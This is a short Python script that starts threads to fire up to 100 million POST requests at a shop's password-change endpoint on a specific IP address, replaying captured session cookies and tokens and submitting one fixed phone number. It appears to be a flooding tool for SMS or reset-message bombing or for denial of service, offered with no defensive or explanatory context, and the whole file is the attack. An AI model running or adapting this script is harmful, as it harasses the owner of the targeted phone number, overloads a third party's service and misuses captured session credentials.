#!/usr/bin/python3

import requests
from threading import Thread

# Function to send a POST request
def send_post_request():
    url = "http://13.250.5.78/shop/pchange"
    headers = {
        "Host": "13.250.5.78",
        "Content-Length": "157",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Origin": "http://13.250.5.78",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Referer": "http://13.250.5.78/shop/forgot",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "my-MM,my;q=0.9,en-US;q=0.8,en;q=0.7,th;q=0.6",
        "Cookie": "_ga=GA1.1.527335143.1718534047; XSRF-TOKEN=eyJpdiI6IkhvRlhobU1CSE82Y3gxeStIb3pJdWc9PSIsInZhbHVlIjoiSXJISWc1YXc2ZG5Wd3pQZW01TkhIS1kzUkFhcm9XdHhma1pramtRbXhFUWFwWmFvQjhXR3llbXQ0RlVlTkszNSIsIm1hYyI6ImFjZTk1YjA3OTYwMmMwZjZkYTM1OGU3ODVjZTBhNTNkNDFjYjhjMGMxZDZmZjAyNmUxYmYyOWNmNjQyOTk0ZjAifQ%3D%3D; td_session=eyJpdiI6Ik45M2d2d2RnUUp4M1B3T3lkUG8yb0E9PSIsInZhbHVlIjoiRysyU3hTZEtjNVptVjZvMTFMM2hicWpmTHRQcEUxNWdzWGtqaVJZd0crQ2pIN2hucFpcL0RZQk5CNUFsaFluaSsiLCJtYWMiOiI4MGQ3OTViYjBjODJiODI0M2M1ZmRkZGVjNzAxMjY5NzQ0OTQzZjgxZGRhNGYwN2FjZTI1ZDc1MDExNDU1NTFlIn0%3D; _ga_65C2Z9RKHJ=GS1.1.1718534046.1.1.1718535252.0.0.0",
        "Connection": "close"
    }
    data = {
        "_token": "NGIW0AF92oj9fs1YU2kr3mnjN4duawrjmiklSNZQ",
        "phone": "09971404793",
        "description": "a" * 100
    }
    try:
        requests.post(url, headers=headers, data=data)
    except requests.exceptions.RequestException as e:
        pass

# Function to create multiple threads
def create_threads(thread_count, request_count):
    threads = []
    count = 0
    for _ in range(thread_count):
        for _ in range(request_count // thread_count):
            thread = Thread(target=send_post_request)
            threads.append(thread)
            thread.start()
            count += 1
    for thread in threads:
        thread.join()
    print(f"Total requests sent: {count}")

# Number of threads
thread_count = 3
# Total number of requests to be sent
request_count = 100000000

# Execute the threads
create_threads(thread_count, request_count)
